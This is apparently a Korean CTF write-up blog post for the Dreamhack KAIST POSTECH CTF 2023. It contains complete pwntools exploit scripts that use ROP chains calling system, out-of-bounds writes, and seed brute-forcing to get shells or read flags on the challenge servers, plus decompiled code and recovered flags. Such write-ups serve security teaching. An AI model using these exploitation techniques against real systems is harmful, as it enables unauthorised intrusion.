table[(tmp\u0026gt;\u0026gt;(6*j))\u0026amp;63] output += padding[len(input):] return output print(encode(\u0026#39;ABCABCABC\u0026#39;)) # AUTH START 0x34786168 FLAG = [0 for i in range(100)] FLAG[0] = 160 // 2 FLAG[1] = 320 // 2 // 2 FLAG[2] = 0x27800000 \u0026gt;\u0026gt; 0x17 FLAG[3] = 3926177678 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[3] \u0026amp;= 0xff FLAG[4] = 260 //2 //2 FLAG[5] = (1039200116 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[6] = 684128790 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[6] \u0026amp;= 0xff FLAG[7] = 428//2//2 FLAG[8] = (4286578688\u0026amp;799156286) \u0026gt;\u0026gt; 0x17 FLAG[9] = 1578560217 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[9] \u0026amp;= 0xff FLAG[10] = 444//2 //2 FLAG[11] = (1002022558\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[12] = 2256925353 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[12] \u0026amp;= 0xff FLAG[13] = 444 // 2 // 2 FLAG[14] = (941616977 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[15] = 3418772988 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[16] \u0026amp;= 0xff FLAG[17] = 440 // 2// 2 FLAG[18] = (797988891\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[19] = 1995915979 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[19] \u0026amp;= 0xff FLAG[20] = 416 // 2// 2 FLAG[21] = (848734036\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[22] = 3608542792 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[22] \u0026amp;= 0xff FLAG[23] = 412 // 2// 2 FLAG[24] = (4286578688 \u0026amp; 816513309) \u0026gt;\u0026gt; 0x17 FLAG[25] = 3969338450 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[25] \u0026amp;= 0xff FLAG[26] = 404 // 2//2 FLAG[27] = (802522653\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[28] = 3063290591 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[29] \u0026amp;= 0xff FLAG[30] = 440 //2 //2 FLAG[31] = (843560064\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[32] = 2364930504 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt;6 FLAG[32] \u0026amp;= 0xff FLAG[33] = 428 // 2//2 FLAG[34] = (883494366\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[35] = 927384544\u0026gt;\u0026gt; 6\u0026gt;\u0026gt; 6 FLAG[35] \u0026amp;= 0xff FLAG[36] = 432 // 2 // 2 FLAG[37] = (805135607\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[38] = 2395425389 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[39] \u0026amp;= 0xff FLAG[40] = 416 // 2// 2 FLAG[41] = (851439545 \u0026amp; 4286578688) \u0026gt;\u0026gt; 0x17 FLAG[42] = 4091936035 \u0026gt;\u0026gt; 6\u0026gt;\u0026gt; 6 FLAG[42] \u0026amp;=0xff FLAG[43] = 400//2//2 FLAG[44] = (888487573\u0026amp;4286578688) \u0026gt;\u0026gt; 0x17 FLAG[45] = 414588904 \u0026gt;\u0026gt; 6 \u0026gt;\u0026gt; 6 FLAG[45] \u0026amp;= 0xff FLAG[46] = 392 //2 //2 FLAG[47] = (912316478\u0026amp;286578688) \u0026gt;\u0026gt; 0x17 FLAG[48] = 1699151259 \u0026gt;\u0026gt; 6\u0026gt;\u0026gt;6 FLAG[48] \u0026amp;= 0xff for i in FLAG: print(chr(i),end=\u0026#39;\u0026#39;) # POKA{ok_now_open_the_gate_and_kill_the_diablo} Exploit 0x347853c0: rsp = rdx // rsp = main+0x70 // back to menu -------- print() --------- 0x347853c8: rax = 880321056 0x347853d8: inc idx ; stack[idx] = rsp ; rsp = 0x3478a220 0x347853e0: rdx = 880300912 ; r12 = 0 0x347853f8: rsp = rdx // rsp = main+0x70 // back to menu -------- exit() --------- 0x34785400: rax = 880301120 0x34785410: inc idx ; stack[idx] = rsp ; rsp = 0x34785440 0x34785418: rdx = 880300912 ; r12 = 0 0x34785430: rsp = rdx // rsp = main+0x70 // back to menu -------- function_4() --------- 0x34785438: mov rsp, rbp ; pop rbp -------- exit_internal() --------- 0x34785440: rdx = 16 ; r12 = 0 0x34785458: rsi = 93966797815986 0x34785468: rdi = 1 0x34785478: rax = 1 0x34785488: sys_write(1, 0x5576599ac0b2, 16) // \u0026#34;really? \u0026lt;y/n\u0026gt;\\n\u0026gt; \u0026#34; 0x34785490: rdi = 0 0x347854a0: rsi = 93966797857408 0x347854b0: rdx = 2 ; r12 = 0 0x347854c8: rax = 0 0x347854d8: sys_read(0, buf_5576599b6280, 2) 0x347854e0: rdi = 2681 0x347854f0: rax = 93966797857408 mov rsp, rbp ; pop rbp는 DOS 취약점으로 이어질 수 있다.\n-------- function_4() --------- 0x34785438: mov rsp, rbp ; pop rbp -------- exit_internal() --------- 0x34785440: rdx = 16 ; r12 = 0 0x34785458: rsi = 93966797815986 0x34785468: rdi = 1 0x34785478: rax = 1 0x34785488: sys_write(1, 0x5576599ac0b2, 16) // \u0026#34;really? \u0026lt;y/n\u0026gt;\\n\u0026gt; \u0026#34; 0x34785490: rdi = 0 0x347854a0: rsi = 93966797857408 0x347854b0: rdx = 2 ; r12 = 0 0x347854c8: rax = 0 0x347854d8: sys_read(0, buf_5576599b6280, 2) 0x347854e0: rdi = 2681 0x347854f0: rax = 93966797857408 0x34785500: rax = (QWORD)(buf_5576599b6280) 0x34785508: rsi = 65535 0x34785518: eax \u0026amp;= esi // eax \u0026amp;= 65535 0x34785520: rax -= rdi // rax -= 2681 0x34785528: rax = 880300112 0x34785538: rdx = 880301408 ; r12 = 0 0x34785550: if true -\u0026gt; rax = 0x34785560 else -\u0026gt; rax = 0x34785050 0x34785558: inc idx ; stack[idx] = rsp ; rsp = rax 0x34785560: rdx = 5 ; r12 = 0 0x34785578: rsi = 93966797815980 0x34785588: rdi = 1 0x34785598: rax = 1 0x347855a8: sys_write(1, 0x5576599ac0ac, 5) // \u0026#34;Bye~\\n\u0026#34; 0x347855b0: rdi = 0 0x347855c0: rax = 60 0x347855d0: sys_exit(0) exit internal을 확인해보면, y/n에 따라 복귀 주소를 저장해놓는다. stack[idx]에 대한 검증이 미흡해 OoB가 가능하다.\n0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; 이러한 가젯들이 존재했는데, 이때 rdx는 나중에 대입된다. 그러면 rdx 쪽 instruction을 건너뛰면, rdx는 잠재적으로 조작될 수 있다. 이를 이용해 .rodata 섹션부터 쭉 메모리를 덤프해서 leak을 달성할 수 있다.\nfrom pwn import * import tqdm # p = process(\u0026#39;./lor\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#39;./libc.so.6\u0026#39;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,14676) for i in tqdm.tqdm(range(0x1040//2)): p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(b\u0026#39;really\u0026#39;,b\u0026#39;n\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; \u0026#39;\u0026#39;\u0026#39; p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) payload = p64(0x34785018) * 4 pause() p.sendlineafter(b\u0026#39;: \u0026#39;,payload) rvu = lambda x : p.recvuntil(x) l = 0 tar = 8103 while l \u0026lt; tar: l += len(p.recv(tar-l)) rv = p.recv() if l \u0026lt; 0x40: rv += p.recv() stdout_ = (u64(rv[0x38:0x38+8])) print(hex(stdout_)) libc_base = stdout_ - libc.sym._IO_2_1_stdout_ success(hex(libc_base)) bin_base = (u64(rv[:8])) -0x12008 success(hex(bin_base)) p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) payload = p64(bin_base + 0x1A280+0x10) * 2 payload += p64(libc_base + 0x000000000002a3e5) payload += p64(libc_base + 0x1d8698) payload += p64(libc_base + libc.sym.system) pause() p.sendafter(b\u0026#39;input: \u0026#39;,payload) p.interactive() # POKA{now_you_are_the_only_diablo!!rule_the_world} Broken Dahun\u0026rsquo;s Heart setvbuf(stdout, 0LL, 2, 0LL); print_hi(); alarm(300u); init_handles(); random = 0; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, \u0026amp;random, 2uLL); // bruteforcable close(fd); srand(random); memset(\u0026amp;s, 0, sizeof(s)); s.sa_flags = 4; s.sa_handler = (__sighandler_t)heal_the_borken_heart;// only called once sigaction(SIGSEGV, \u0026amp;s, 0LL); // Sigsegv memset(\u0026amp;s, 0, sizeof(s)); s.sa_flags = 4; s.sa_handler = (__sighandler_t)exit_handler; sigaction(SIGALRM, \u0026amp;s, 0LL); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;( \u0026amp;std::cout, \u0026#34;We should not let this stupid misunderstanding get in our way. We deserve another chance.\u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v3, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); try_again(); } 마찬가지로 enum을 정의해서 쓰면된다.\nucontext_t *__fastcall heal_the_borken_heart(int a1, siginfo_t *a2, ucontext_t *ctx) { ucontext_t *result; // rax if ( check \u0026gt; 1 ) exit(255); ++check; result = ctx; ctx-\u0026gt;uc_mcontext.gregs[0x10] = broken_heart_handlers[game_step]; return result; // rip = handler } // 한번에 한하여 heal_the_broken_heart 함수를 호출하며 context가 복구된다.\nstd::ostream::operator\u0026lt;\u0026lt;(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;5. PROPOSE\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;\u0026gt; \u0026#34;); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, nptr); switch ( atoi(nptr) ) { case 1: // money int bug mildang(); // OoB random add or sub break; case 2: call(); // charming down break; case 3: sms(); // info leak / money unsigned break; case 4: date(); // money unsigned break; case 5: propose(); break; default: return __readfsqword(0x28u) ^ v8; } return __readfsqword(0x28u) ^ v8; } // get std::ostream::operator\u0026lt;\u0026lt;(v2, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Choose: \u0026#34;); std::istream::operator\u0026gt;\u0026gt;(\u0026amp;std::cin, \u0026amp;choice); if ( i \u0026lt; choice || !sms_list[choice] ) // choice Oob broke_again(); f = rand(); val = rand(); v9 = rand(); money -= v9 % 5000; if ( (f \u0026amp; 1) != 0 ) { love_gauge -= f % 10; charming -= val % 10; v3 = mildang_gauge[choice] - (unsigned __int8)val; } else { love_gauge += f % 10; charming += val % 10; v3 = (unsigned __int8)val + mildang_gauge[choice]; } mildang_gauge[choice] = v3; 이때 choice에 대한 OoB addition, subtraction이 가능하다. 이때 약간의 조건들이 있는데 이러한 조건들은 OoB를 통해 해결한다.\nstd::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Phone number: \u0026#34;); read(0, buf, 255uLL); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Message: \u0026#34;); read(0, v13, 255uLL); v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;[\u0026#34;); v2 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v1, buf); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v2, \u0026#34;]\u0026#34;);// info leak std::ostream::operator\u0026lt;\u0026lt;(v3, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, v13); std::ostream::operator\u0026lt;\u0026lt;(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Sent!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); if ( rand() % 10 ) { v9 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh !!!!!!!!!! She did not replied,, ,, :(!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v9, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } else { v6 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh !!!!!!!!!! She replied,, ,, Yes!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v6, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v7 = rand() % 6; v8 = g_sms_index++; sms_list[v8] = msg[v7]; } } memory leak이 가능하며 money는 unsigned 비교를 거친다. 이를 이용해 나중에 integer overflow \u0026amp; underflow를 트리거해버리면 된다.\nmoney -= 100000; v3 = rand(); if ( !((int)v3 % 0xBEBC200) \u0026amp;\u0026amp; charming \u0026gt; 100000 ) { v0 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v0, v3); std::ostream::operator\u0026lt;\u0026lt;(); Get_shell(); } v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;-_-\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v1, v3); std::ostream::operator\u0026lt;\u0026lt;(); return broke_again(); } 4바이트 정도는 충분히 bruteforce로 뚫을만하다. 하지만 charming을 증가시키려 앞선 random들을 뚫으려면 300초안에 불가능하다.\nExploit # 1) srand seed prediction is possible. cuz it is only 2 bytes long. # 2) info leak is possible u can get the base of binary, stack # 3) place get shell func through OoB add # 4) modify gamestep to exec that func from pwn import * import ctypes libc = ctypes.CDLL(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) def seed_brute(arr): global libc ret = [] for i in range(0x10000): libc.srand(i) f = 1 for j in arr: if j != (libc.rand()%10): f = 0 break if f: ret.append(i) return ret sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) # p = process(\u0026#39;./bdh\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,20804) def get_charm(): sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Charming Point]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) return n res = [] diff = 500 for i in range(0x20): v = get_charm() diff -= v res.append(diff) diff = v ret = seed_brute(res) assert len(ret) == 1 ret = ret[0] success(f\u0026#39;seed : {ret}\u0026#39;) libc.srand(ret) for i in range(len(res)): libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;3\u0026#39;) pay = b\u0026#39;A\u0026#39;*0xa8 sa(b\u0026#39;: \u0026#39;, pay) pay = b\u0026#39;A\u0026#39;*0x40 sa(b\u0026#39;: \u0026#39;, pay) rvu(b\u0026#39;A\u0026#39;*0xa8) libc_base = u64(rvu(b\u0026#39;]\u0026#39;)[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x8aeed success(hex(libc_base)) rvu(b\u0026#39;A\u0026#39;*0x40) bin_base = u64(rvu(b\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x81a0 success(hex(bin_base)) if ((libc.rand()%10) == 0): libc.rand() # functon ptr # -824 -\u0026gt; binary_ptr # ptr diff rw - 0x5fb1 # lovegauge # oob idx -\u0026gt; -101 * 8 def oob_add(idx, x): global libc while True: r = libc.rand() is_add = not (r\u0026amp;1) if is_add: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;adding: {hex(x)}\u0026#39;) x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(idx)) if x \u0026lt;= 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) def oob_sub(idx, x,f): global libc while True: is_sub = (libc.rand()\u0026amp;1) if is_sub: if f==0: val = (libc.rand()) % 10 else: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;subtracting: {hex(x)}\u0026#39;) if f: if (x - val) \u0026lt; 0: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) # if idx == -102: # print(hex(val)) # pause() sla(b\u0026#39;Choose: \u0026#39;,str(idx)) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) if f: if n \u0026lt; 0: oob_add(-101, 0x50) if f: if x == 0: break else: if x \u0026lt;= 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) def oob_sub_at_once(idx, x): global libc while True: is_sub = (libc.rand()\u0026amp;1) if is_sub: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;subtracting: {hex(x)}\u0026#39;) if val != x: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(idx)) if x == 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) oob_sub(-0x67, 0x5fb1, 1) # preparing function ptr success(b\u0026#39;prepared fptr\u0026#39;) r = libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) success(f\u0026#39;gauge: {n}\u0026#39;) x = n + 200 while True: tmp = libc.rand() is_sub = (tmp\u0026amp;1) if is_sub: libc.rand() val = tmp % 10 if (x - val) \u0026lt; 0: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(-100)) if x == 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) success(f\u0026#39;gauge: {n}\u0026#39;) pause() oob_sub_at_once(-102, 1+0x77) # preparing function ptr p.interactive() # KAPO{ac98a027d8c41b726576b169f4c5bba187be5bb2d3a9e88523f5ea0a2264ef4a} gamestep을 덮고, 마지막에 SIGSEGV를 내주면 handler가 호출되면서 임의 주소에 대한 호출 primitive를 만들 수 있다. 미리 OoB addition으로 함수 포인터 주소를 만들고 idx를 변조해 임의 주소에 대한 호출을 통해 shell을 획득한다.\nAvatar: Crude Shadow push_shadow(\u0026amp;shadow_sp, shadow_stack); setup(); init_seccomp(); // useless puts(\u0026#34;shadow test\u0026#34;); exit = 0; do { menu(); __isoc99_scanf(\u0026#34;%d\u0026#34;); switch ( in ) { case 1: print_shadow(shadow_sp, shadow_stack); break; case 2: puts(\u0026#34;string input:\u0026#34;); read(0, buf, 0x400uLL); break; case 3: nested_func(\u0026amp;shadow_sp, shadow_stack); break; case 4: puts(\u0026#34;lol you can\u0026#39;t\u0026#34;); break; case 5: exit = 1; break; default: puts(\u0026#34;nono\u0026#34;); break; } } while ( !exit ); print_shadow(shadow_sp, shadow_stack); pop_shadow(\u0026amp;shadow_sp, shadow_stack); return 0; } shadow stack이 구현되어있다. bof도 대놓고 준다.\nExploit from pwn import * sla = lambda x,y :p.sendlineafter(x,y) rvu = lambda x : p.recvuntil(x) \\#p = process(\u0026#39;./avatar\u0026#39;,env={\u0026#39;LD_PRELOAD\u0026#39;:\u0026#39;../libc.so.6\u0026#39;}) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,10351) context.binary = e = ELF(\u0026#39;./avatar\u0026#39;) libc = ELF(\u0026#39;../libc.so.6\u0026#39;) sla(b\u0026#39;5\u0026#39;,b\u0026#39;3\u0026#39;) sla(b\u0026#39;2\u0026#39;,b\u0026#39;1\u0026#39;) rvu(b\u0026#39;:\\n\u0026#39;) libc_base = int(rvu(\u0026#39;\\n\u0026#39;)[:-1],16) - 0x29d90 bin_base = int(rvu(\u0026#39;\\n\u0026#39;)[:-1],16) - 0x1782 success(hex(libc_base)) success(hex(bin_base)) sla(b\u0026#39;2\u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;2\u0026#39;,b\u0026#39;2\u0026#39;) payload = b\u0026#39;\u0026#39; payload += p64(libc_base + 0x0000000000029cd6) payload += b\u0026#39;A\u0026#39;*0x50 payload += p64(11) payload += p64(libc_base + 0x0000000000029cd6) payload += p64(libc_base + 0x0000000000029cd6) prdi = p64(libc_base + 0x000000000002a3e5) prax = p64(libc_base + 0x0000000000045eb0) prsi = p64(libc_base + 0x000000000002be51) prdxr12 = p64(libc_base + 0x000000000011f497) payload += prdi payload += p64(0) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200)*2 payload += p64(libc_base + libc.sym.read) payload += prdi payload += p64(e.bss() + bin_base + 0x500) payload += prsi payload += p64(0) payload += prdxr12 payload += p64(0)*2 payload += p64(libc_base + libc.sym.open) payload += prdi payload += p64(3) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200)*2 payload += p64(libc_base + libc.sym.read) payload += prdi payload += p64(1) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200) payload += p64(0x200) payload += p64(libc_base + libc.sym.write) success(hex(len(payload))) prdxr12 = p64(libc_base + 0x000000000011f497) p.sendafter(b\u0026#39;input:\u0026#39;,payload) p.sendafter(b\u0026#39;5\u0026#39;,b\u0026#39;5\u0026#39;) sleep(0.2) pause() p.send(b\u0026#39;../flag\u0026#39;) p.interactive() # POKA{150_PLUS_ISO_T0T4L_300_HE4D} ","permalink":"https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/","summary":"개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \u0026#34;args\u0026#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;username\u0026#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.","title":"Dreamhack Kaist Postech CTF"},{"content":"PCPU 대회 끝나기 2시간정도 전에 잡았었는데, 분석하기 빡세고 구조체도 많아서 시간내로 못풀었다. 나중에 끝나고 천천히 풀어봤다. 파이프라이닝이 적용된 VCPU 컨셉의 문제다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { init_(); input_validchk(); // opcode(1byte) | operands(3bytes) while ( PC \u0026lt;= instr_sz ) { run_cycle(); ++PC; } run_cycle(); run_cycle(); run_cycle(); print_cycle(); return 0LL; } int init_() { unsigned int v0; // eax v0 = time(0LL); srand(v0); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); IF_NODE = malloc(0x10uLL); ID_NODE = malloc(0x10uLL); OF_NODE = malloc(0x10uLL); EX_NODE = malloc(0x10uLL); REG = malloc(0x20uLL); memset(REG, 0, sizeof(REG_SETS)); init_m(IF_NODE); init_m(ID_NODE); init_m(OF_NODE); init_m(EX_NODE); ANON.is_active = 1LL; // 06230 *ANON.payload = rand() % 10; ANON1.is_active = 1LL; // 16238 *ANON1.payload = rand() % 10; ANON2.is_active = 1LL; // 26240 *ANON2.payload = rand() % 10; ANON3.is_active = 1LL; // 0036248 *ANON3.payload = rand() % 10; pthread_mutex_init(\u0026amp;IF_mutex, 0LL); // 10008 pthread_mutex_init(\u0026amp;ID_mutex, 0LL); pthread_mutex_init(\u0026amp;OF_mutex, 0LL); return pthread_mutex_init(\u0026amp;mutex_4, 0LL); } void input_validchk() { const char *v0; // rax int stat_loc; // [rsp+18h] [rbp-58h] BYREF unsigned int v2; // [rsp+1Ch] [rbp-54h] char *argv[4]; // [rsp+20h] [rbp-50h] BYREF __pid_t pid; // [rsp+44h] [rbp-2Ch] char *v5; // [rsp+48h] [rbp-28h] size_t j; // [rsp+50h] [rbp-20h] FILE *stream; // [rsp+58h] [rbp-18h] void *s; // [rsp+60h] [rbp-10h] size_t i; // [rsp+68h] [rbp-8h] printf(\u0026#34;Inst Size \u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%ld\u0026#34;, \u0026amp;instr_sz); instr = calloc(4uLL, instr_sz); for ( i = 0LL; i \u0026lt; instr_sz; ++i ) { printf(\u0026#34;Inst %lu \u0026gt; \u0026#34;, i); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;instr[i]); } PC = 0LL; s = malloc(0x20uLL); memset(s, 0, 0x20uLL); v0 = mkrandSTR(16); snprintf(s, 0x20uLL, \u0026#34;/tmp/ctf-%s\u0026#34;, v0); stream = fopen(s, \u0026#34;w\u0026#34;); fprintf(stream, \u0026#34;%lu\\n\u0026#34;, instr_sz); for ( j = 0LL; j \u0026lt; instr_sz; ++j ) fprintf(stream, \u0026#34;%d\\n\u0026#34;, instr[j]); fclose(stream); v5 = malloc(0x100uLL); memset(v5, 0, 0x100uLL); snprintf(v5, 0x100uLL, \u0026#34;python3 ./precheck.py %s 1\u0026gt;/dev/null 2\u0026gt;/dev/null\u0026#34;, s); pid = fork(); if ( pid == -1 ) { perror(\u0026#34;fork failed\u0026#34;); exit(1); } if ( !pid ) { argv[0] = \u0026#34;/bin/sh\u0026#34;; argv[1] = \u0026#34;-c\u0026#34;; argv[2] = v5; argv[3] = 0LL; v2 = execve(\u0026#34;/bin/sh\u0026#34;, argv, 0LL); printf(\u0026#34;%d\\n\u0026#34;, v2); } if ( waitpid(pid, \u0026amp;stat_loc, 0) == -1 ) { perror(\u0026#34;waitpid failed\u0026#34;); exit(1); } if ( (stat_loc \u0026amp; 0x7F) == 0 \u0026amp;\u0026amp; (stat_loc \u0026amp; 0xFF00) \u0026gt;\u0026gt; 8 == 1 ) { printf(\u0026#34;Invalid opcodes\\n\u0026#34;); exit(1); } free(s); free(v5); } 여기서 4바이트 instructions 받고 precheck.py 호출해서 유효성 검사를 수행한다.\nfrom pwn import * import sys import os f = open(sys.argv[1], 